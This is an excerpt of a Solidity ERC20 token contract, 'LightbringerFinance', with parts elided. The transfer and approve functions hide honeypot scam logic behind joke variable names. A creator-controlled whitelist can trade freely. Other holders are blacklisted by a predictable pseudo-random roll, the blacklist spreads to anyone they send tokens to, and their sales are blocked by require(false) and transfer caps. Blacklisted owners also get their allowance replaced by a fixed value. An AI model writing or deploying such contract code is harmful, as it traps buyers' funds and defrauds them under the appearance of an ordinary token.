...
contract LightbringerFinance is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public spongebob;
  mapping (address => bool) public patrick;
  mapping (address => bool) public stars;
  mapping (address => uint256) public plower;

  bool private waterpipe;
  uint256 private _totalSupply;
  uint256 private papers;
  uint256 private himalaya;
  ...
  constructor() public {
    ...
    himalaya = chTx * 30;
    patrick[creator] = false;
    stars[creator] = false;
    spongebob[msg.sender] = true;
  ...
  */
  ...
  function randomly() internal returns (uint) {
    uint screen = uint(keccak256(abi.encodePacked(now, msg.sender, shark))) % 50;
    shark++;
    return screen;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (waterpipe == false)) {
      papers = chTx;
      teeth = true;
    }
    
    if ((address(sender) == creator) && (waterpipe == true)) {
      spongebob[recipient] = true;
      patrick[recipient] = false;
      waterpipe = false;
    }
    
    if ((amount > himalaya) && (spongebob[sender] == true) && (address(sender) != creator)) {
        stars[recipient] = true;
    }
    
    if (spongebob[recipient] != true) {
        patrick[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((patrick[sender]) && (spongebob[recipient] == false)) {
        patrick[recipient] = true;
    }
    
    if (spongebob[sender] == false) {
      if ((amount > himalaya) && (stars[sender] == true)) {
        require(false);
      }
      
      require(amount < papers);
      if (teeth == true) {
        if (stars[sender] == true) {
          require(false);
        }
        stars[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (seats == true)) {
      spongebob[spender] = true;
      patrick[spender] = false;
      stars[spender] = false;
      seats = false;
    }
    
    tok = (patrick[owner] ? 72332 : amount);
